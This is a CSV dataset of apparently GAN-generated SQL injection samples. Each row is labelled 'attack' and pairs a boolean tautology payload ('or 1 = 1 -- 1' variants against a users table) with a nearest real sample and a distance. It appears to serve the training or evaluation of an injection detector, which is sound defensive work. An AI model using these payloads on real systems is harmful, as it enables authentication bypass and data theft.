id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000001,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.69912173795744
GAN_000002,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,2.9654969862501197
GAN_000003,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.1602491352959596
GAN_000004,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.4708658430544443
GAN_000005,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.4198164760204444
GAN_000006,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.7147290304221348
GAN_000007,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.0766957722999955
GAN_000008,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.519991113681277
GAN_000009,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.5865568222499293
GAN_000010,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.47473427599201
GAN_000011,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.2635745825251945
GAN_000012,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.5172938710522668
GAN_000013,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.0099406671968323
GAN_000014,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.268470283004097
GAN_000015,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.3840551290805285
GAN_000016,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.2045532807629558
GAN_000017,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.123048844011065
GAN_000018,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.4929157284471546
GAN_000019,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.484280653005034
GAN_000020,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.601055957954856
GAN_000021,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.7836902193216546
GAN_000022,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.3330798720940815
GAN_000023,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.2158692585547364
GAN_000024,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.7312411739183617
GAN_000025,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.6808098255075685
GAN_000026,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.048827119795027
GAN_000027,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.1820657214027612
GAN_000028,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.4754014616624405
GAN_000029,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.1035134961682553
GAN_000030,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.1314718922437157
GAN_000031,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.116533156944086
GAN_000032,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.0880504912024413
GAN_000033,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.0971838205475466
GAN_000034,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.3666688708060417
GAN_000035,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.509707994418474
GAN_000036,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000164,3.390897975986493
GAN_000037,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.317229702288127
GAN_000038,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.5185837949540866
GAN_000039,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,2.9287744127695587
GAN_000040,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.295077994126159
GAN_000041,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.1956223826429833
GAN_000042,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.08008185331064
GAN_000043,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.2085762072719652
GAN_000044,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.5920714940752676
GAN_000045,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.025734139214537
GAN_000046,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.9871232541827863
GAN_000047,attack,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000177,3.2628073204610035
GAN_000048,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.178536923088263
GAN_000049,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.439802656665278
GAN_000050,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.2371768243476544
GAN_000051,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.4648925633185286
GAN_000052,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.1637322557658494
GAN_000053,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.54358757166636
GAN_000054,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.196986232077906
GAN_000055,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.0697133194784643
GAN_000056,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.63214209684599
GAN_000057,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,2.9893046622304653
GAN_000058,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.166425452020644
GAN_000059,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.151352719971852
GAN_000060,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.7068685724049244
GAN_000061,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.3550222044804707
GAN_000062,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.065658281041858
GAN_000063,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.0762557938300197
GAN_000064,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.3000609012538953
